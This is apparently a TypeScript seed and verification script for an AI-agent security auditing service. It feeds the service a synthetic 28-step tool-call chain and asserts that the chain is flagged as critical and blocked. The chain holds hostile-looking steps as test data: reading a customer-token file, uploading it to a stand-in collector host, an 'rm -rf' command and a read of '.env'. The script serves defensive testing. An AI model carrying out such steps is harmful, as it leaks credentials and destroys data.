import { randomUUID } from "node:crypto";

const baseUrl = process.env.TRACESHIELD_CORE_BASE_URL ?? "http://127.0.0.1:8787";
const fixedIds = {
  sessionId: "demo-agent-security-long-chain",
  runId: "run-ai-security-chain-001",
  traceId: "trace-ai-security-chain-001",
};
const sensitiveResource = "vault/customer_tokens.csv";
const userGoal = "调查异常 Agent 数据外发行为，并追踪完整工具调用链。";

interface ChainStep {
  stepSeq: number;
  toolName: string;
  toolKind: string;
  rawParams: Record<string, unknown>;
  resourceHint: string;
  riskHint?: string;
  resultPreview: string;
}

interface AuditDecision {
  decision: "ALLOW" | "WARN" | "ASK" | "BLOCK";
  risk_level: "low" | "medium" | "high" | "critical";
  reason: string;
  matched_rules: string[];
}

interface MethodStatus {
  mode: "legacy" | "shadow" | "enforce";
  available: boolean;
  queue_depth: number;
  pending_requests: number;
}

interface MethodEvaluation {
  run_id: string;
  step_seq: number | null;
  status: string;
  error_code: string | null;
  error_message: string | null;
}

const health = await get<{ ok: boolean; db_connected: boolean }>("/health");
assert(health.ok && health.db_connected, "TraceShield Core or PostgreSQL is not healthy");

const ids = await resolveRunIds();
const idToken = ids.runId === fixedIds.runId ? "001" : ids.runId.slice(fixedIds.runId.length + 1);
const steps = buildChainSteps();
const decisions = new Map<number, AuditDecision>();
let lastEventTimestamp = Date.now() - 1;

await insertTraceEvent("message_received", `long-chain-message-received-${idToken}`, {
  message_id: `long-chain-user-message-${idToken}`,
  role: "user",
  content: userGoal,
  content_hash: `long-chain-user-message-hash-${idToken}`,
  summary: { preview: userGoal, purpose: "long-chain-security-demo" },
});

for (const step of steps) {
  const toolCallId = toolId(step.stepSeq);
  const decision = await post<AuditDecision>("/v1/audit/tool-call", {
    request_id: `long-chain-audit-${pad(step.stepSeq)}-${idToken}`,
    schema_version: "v1",
    session_id: ids.sessionId,
    run_id: ids.runId,
    trace_id: ids.traceId,
    tool_call_id: toolCallId,
    step_seq: step.stepSeq,
    semantic_schema_version: "v1",
    correlation_source: "long_chain_seed",
    tool_name: step.toolName,
    tool_kind: step.toolKind,
    raw_params: step.rawParams,
    param_summary: step.rawParams,
    resource_hint: step.resourceHint,
    ...(step.riskHint ? { risk_hint: step.riskHint } : {}),
    context: {
      user_goal: userGoal,
      workspace_root: "/workspace/security-investigation",
    },
  });
  decisions.set(step.stepSeq, decision);

  const prevented = decision.decision === "ASK" || decision.decision === "BLOCK";
  const result = await post<{ inserted: number; tool_result_extracted: number }>("/v1/events/batch", {
    events: [
      traceEvent("after_tool_call", `long-chain-result-${pad(step.stepSeq)}-${idToken}`, {
        tool_call_id: toolCallId,
        tool_name: step.toolName,
        tool_kind: step.toolKind,
        step_seq: step.stepSeq,
        correlation_source: "long_chain_seed",
        param_summary: step.rawParams,
        ...(step.riskHint ? { risk_hint: step.riskHint } : {}),
        result_preview: prevented
          ? `TraceShield 在执行前阻止了步骤 ${step.stepSeq}：${decision.reason ?? step.resultPreview}`
          : step.resultPreview,
        result_hash: `long-chain-result-hash-${pad(step.stepSeq)}-${idToken}`,
        result_summary: {
          preview: prevented ? `步骤 ${step.stepSeq} 未执行，处置结果为 ${decision.decision}` : step.resultPreview,
          decision: decision.decision,
        },
        ...(prevented
          ? {
              error: {
                code: "prevented_by_policy",
                message: `Execution was prevented by ${decision.decision}`,
              },
            }
          : {}),
        duration_ms: 4 + step.stepSeq,
      }),
    ],
  });
  assert(
    result.inserted === 1 && result.tool_result_extracted === 1,
    `Step ${step.stepSeq} result was not extracted`,
  );
  console.log(
    `[${pad(step.stepSeq)}/${steps.length}] ${step.toolName} -> ${decision.decision}/${decision.risk_level}`,
  );
}

await insertTraceEvent("llm_output", `long-chain-llm-output-${idToken}`, {
  message_id: `long-chain-assistant-message-${idToken}`,
  role: "assistant",
  content: "已完成 28 步安全调查。TraceShield 识别出敏感数据传播、外部发送、危险命令和密钥访问。",
  content_hash: `long-chain-assistant-message-hash-${idToken}`,
  summary: {
    preview: "完成 28 步 Agent 安全调查，已固化敏感数据传播和执行前阻断证据。",
    purpose: "long-chain-security-demo",
  },
});
await insertTraceEvent("agent_end", `long-chain-agent-end-${idToken}`, {
  message_id: `long-chain-agent-end-message-${idToken}`,
  role: "assistant",
  content: "Agent security investigation completed.",
  content_hash: `long-chain-agent-end-hash-${idToken}`,
  summary: { preview: "Agent 安全调查运行完成。", total_steps: steps.length },
});

const methodStatus = await waitForMethodEvaluation();
await verifySeed(methodStatus);

const decisionCounts = [...decisions.values()].reduce<Record<string, number>>((counts, decision) => {
  counts[decision.decision] = (counts[decision.decision] ?? 0) + 1;
  return counts;
}, {});

console.log("TraceShield long-chain demo data created and verified.");
console.log(`session_id=${ids.sessionId}`);
console.log(`run_id=${ids.runId}`);
console.log(`trace_id=${ids.traceId}`);
console.log(`tool_calls=${steps.length}`);
console.log(`decisions=${JSON.stringify(decisionCounts)}`);
console.log(`method_mode=${methodStatus.mode}`);

function buildChainSteps(): ChainStep[] {
  const chain: ChainStep[] = [
    {
      stepSeq: 1,
      toolName: "read_file",
      toolKind: "file_read",
      rawParams: { path: sensitiveResource, purpose: "authorized security investigation" },
      resourceHint: sensitiveResource,
      resultPreview: "已读取授权安全样本中的客户令牌记录。",
    },
  ];

  for (let stepSeq = 2; stepSeq <= 24; stepSeq += 1) {
    const contextPath = `scratch/security-chain/context-${pad(stepSeq)}.md`;
    if (stepSeq % 2 === 0) {
      chain.push({
        stepSeq,
        toolName: "summarize_text",
        toolKind: "transform",
        rawParams: {
          input_sources: [sensitiveResource],
          stage: stepSeq,
          instruction: `Preserve the private token context for investigation stage ${stepSeq}`,
        },
        resourceHint: `memory://security-chain/stage-${pad(stepSeq)}`,
        resultPreview: `已完成第 ${stepSeq} 阶段令牌上下文归纳。`,
      });
    } else {
      chain.push({
        stepSeq,
        toolName: "write_file",
        toolKind: "file_write",
        rawParams: {
          path: contextPath,
          input_sources: [sensitiveResource],
          content_source: `private token investigation stage ${stepSeq}`,
        },
        resourceHint: contextPath,
        resultPreview: `已写入第 ${stepSeq} 阶段调查上下文。`,
      });
    }
  }

  chain.push(
    {
      stepSeq: 25,
      toolName: "network_post",
      toolKind: "network_request",
      rawParams: {
        url: "https://collector.example/upload",
        input_sources: [sensitiveResource],
        body: "private token investigation context",
      },
      resourceHint: "https://collector.example/upload",
      riskHint: "network_request",
      resultPreview: "外部上传请求已进入审批流程。",
    },
    {
      stepSeq: 26,
      toolName: "unknown",
      toolKind: "unknown",
      rawParams: { operation: "opaque_agent_extension", source_refs: [sensitiveResource] },
      resourceHint: "unknown://agent-extension",
      riskHint: "unknown",
      resultPreview: "未知扩展调用已记录并标记告警。",
    },
    {
      stepSeq: 27,
      toolName: "shell_exec",
      toolKind: "shell_exec",
      rawParams: { command: "rm -rf /tmp/traceshield-demo-cache", source_refs: [sensitiveResource] },
      resourceHint: "rm -rf /tmp/traceshield-demo-cache",
      riskHint: "file_delete",
      resultPreview: "危险清理命令已进入审批流程。",
    },
    {
      stepSeq: 28,
      toolName: "file_read",
      toolKind: "file_read",
      rawParams: { path: ".env", source_refs: [sensitiveResource] },
      resourceHint: ".env",
      resultPreview: "敏感环境文件读取已被阻止。",
    },
  );
  return chain;
}

async function resolveRunIds(): Promise<typeof fixedIds> {
  const fixedSessionExists = await sessionExists(fixedIds.sessionId);
  if (!fixedSessionExists) return fixedIds;

  const timestamp = new Date().toISOString().replace(/[-:.TZ]/g, "");
  const suffix = `${timestamp}-${randomUUID().slice(0, 6)}`;
  console.log(
    `Fixed demo session ${fixedIds.sessionId} already exists; creating an isolated rerun with suffix ${suffix}.`,
  );
  return {
    sessionId: `${fixedIds.sessionId}-${suffix}`,
    runId: `${fixedIds.runId}-${suffix}`,
    traceId: `${fixedIds.traceId}-${suffix}`,
  };
}

async function sessionExists(sessionId: string): Promise<boolean> {
  const response = await fetch(
    new URL(`/v1/audit/sessions/${encodeURIComponent(sessionId)}/runs`, baseUrl),
  );
  if (response.status === 404) return false;
  if (!response.ok) {
    throw new Error(`Could not check existing demo session: ${response.status} ${await response.text()}`);
  }
  return true;
}

async function waitForMethodEvaluation(): Promise<MethodStatus> {
  const deadline = Date.now() + 30_000;
  let lastStatus = await get<MethodStatus>("/v1/method/status");
  if (lastStatus.mode === "legacy") {
    console.log("Method engine is in legacy mode; queue polling is not required.");
    return lastStatus;
  }

  while (Date.now() < deadline) {
    lastStatus = await get<MethodStatus>("/v1/method/status");
    const evaluations = await get<{ evaluations: MethodEvaluation[] }>("/v1/method/evaluations?limit=200");
    const finalEvaluation = evaluations.evaluations.find(
      (evaluation) => evaluation.run_id === ids.runId && evaluation.step_seq === steps.length,
    );
    const queueIdle = lastStatus.queue_depth === 0 && lastStatus.pending_requests === 0;

    if (queueIdle && finalEvaluation?.status === "ok") return lastStatus;
    if (
      queueIdle &&
      finalEvaluation &&
      ["error", "timeout", "unavailable"].includes(finalEvaluation.status)
    ) {
      throw new Error(
        `Final Method evaluation failed: ${finalEvaluation.status} ${finalEvaluation.error_code ?? ""} ${finalEvaluation.error_message ?? ""}`,
      );
    }
    await delay(100);
  }
  throw new Error(
    `Timed out waiting for Method evaluation (queue=${lastStatus.queue_depth}, pending=${lastStatus.pending_requests})`,
  );
}

async function verifySeed(methodStatus: MethodStatus): Promise<void> {
  const runs = await get<{
    runs: Array<{
      run_id: string;
      tool_call_count: number;
      blocked_count: number;
      status: string;
      ended_at: string | null;
      risk_level: string;
    }>;
  }>(`/v1/audit/sessions/${encodeURIComponent(ids.sessionId)}/runs`);
  const run = runs.runs.find((item) => item.run_id === ids.runId);
  assert(run !== undefined, "Seeded run is missing from the session query");
  assert(run.tool_call_count === steps.length, `Expected ${steps.length} tool calls, got ${run.tool_call_count}`);
  assert(run.blocked_count >= 1, "Expected at least one blocked tool call");
  assert(run.risk_level === "critical", `Expected critical run risk, got ${run.risk_level}`);
  assert(run.status === "completed" && run.ended_at !== null, "Seeded run was not completed by agent_end");

  const auditEvents = await get<{
    events: Array<{ run_id: string; tool_call_id: string; step_seq: number | null }>;
  }>("/v1/audit/events?limit=200");
  const runEvents = auditEvents.events
    .filter((event) => event.run_id === ids.runId)
    .sort((left, right) => (left.step_seq ?? 0) - (right.step_seq ?? 0));
  assert(runEvents.length === steps.length, `Expected ${steps.length} audit events, got ${runEvents.length}`);
  assert(
    runEvents.every((event, index) => event.step_seq === index + 1),
    "Seeded audit events do not have a contiguous 1..28 step sequence",
  );

  const evidence = await get<{ steps: unknown[] }>(`/v1/runs/${encodeURIComponent(ids.runId)}/evidence-path`);
  assert(
    evidence.steps.length === steps.length * 3,
    `Expected ${steps.length * 3} evidence steps, got ${evidence.steps.length}`,
  );

  const conversation = await get<{ messages: unknown[] }>(
    `/v1/runs/${encodeURIComponent(ids.runId)}/conversation-summary`,
  );
  assert(conversation.messages.length === 3, `Expected 3 conversation events, got ${conversation.messages.length}`);

  const graph = await get<{
    graph_source: "method" | "legacy_linear";
    nodes: Array<{ id?: string }>;
    edges: Array<{ source?: string; target?: string; type?: string }>;
  }>(`/v1/runs/${encodeURIComponent(ids.runId)}/risk-graph`);
  assert(graph.nodes.length >= steps.length + 1, `Risk graph is too short: ${graph.nodes.length} nodes`);
  assert(graph.edges.length >= steps.length, `Risk graph is too short: ${graph.edges.length} edges`);
  if (methodStatus.mode !== "legacy") {
    assert(graph.graph_source === "method", `Expected Method graph, got ${graph.graph_source}`);
    const incomingByViolation = new Map<string, Set<string>>();
    for (const edge of graph.edges) {
      if (edge.type !== "blocked_by" || !edge.target || !edge.source) continue;
      const incoming = incomingByViolation.get(edge.target) ?? new Set<string>();
      incoming.add(edge.source);
      incomingByViolation.set(edge.target, incoming);
    }
    const longestRiskPath = Math.max(0, ...[...incomingByViolation.values()].map((sources) => sources.size));
    assert(longestRiskPath >= 25, `Expected a 25-step Method risk path, got ${longestRiskPath}`);
  }

  const finalDecision = await get<{ decision: { decision: string }; rule_hits: unknown[] }>(
    `/v1/tool-calls/${encodeURIComponent(toolId(28))}/decision`,
  );
  assert(finalDecision.decision.decision === "BLOCK", "The final .env access was not blocked");
  assert(finalDecision.rule_hits.length >= 1, "The final blocked decision has no policy evidence");
}

async function insertTraceEvent(type: string, eventId: string, payload: Record<string, unknown>): Promise<void> {
  const expectedMessageCount = ["message_received", "llm_output", "agent_end"].includes(type) ? 1 : 0;
  const result = await post<{ inserted: number; message_extracted: number }>("/v1/events/batch", {
    events: [traceEvent(type, eventId, payload)],
  });
  assert(result.inserted === 1, `${type} event was not inserted`);
  assert(result.message_extracted === expectedMessageCount, `${type} message extraction failed`);
}

function traceEvent(type: string, eventId: string, payload: Record<string, unknown>): Record<string, unknown> {
  lastEventTimestamp = Math.max(Date.now(), lastEventTimestamp + 1);
  return {
    event_id: eventId,
    schema_version: "v1",
    type,
    timestamp: lastEventTimestamp,
    plugin_id: "traceshield-long-chain-seed",
    session_id: ids.sessionId,
    run_id: ids.runId,
    trace_id: ids.traceId,
    mode: "async",
    payload,
  };
}

function toolId(stepSeq: number): string {
  return `long-chain-tool-${pad(stepSeq)}-${idToken}`;
}

function pad(value: number): string {
  return String(value).padStart(2, "0");
}

function delay(milliseconds: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, milliseconds));
}

async function get<T>(path: string): Promise<T> {
  return requestJson<T>(path, { method: "GET" });
}

async function post<T>(path: string, body: unknown): Promise<T> {
  return requestJson<T>(path, { method: "POST", body });
}

interface RequestOptions {
  method: "GET" | "POST";
  body?: unknown;
}

async function requestJson<T>(path: string, options: RequestOptions): Promise<T> {
  const response = await fetch(new URL(path, baseUrl), {
    method: options.method,
    ...(options.body !== undefined
      ? { headers: { "content-type": "application/json" }, body: JSON.stringify(options.body) }
      : {}),
  });
  const body = (await response.json()) as unknown;
  if (!response.ok) {
    throw new Error(`${options.method} ${path} failed: ${response.status} ${JSON.stringify(body)}`);
  }
  return body as T;
}

function assert(condition: boolean, message: string): asserts condition {
  if (!condition) throw new Error(message);
}
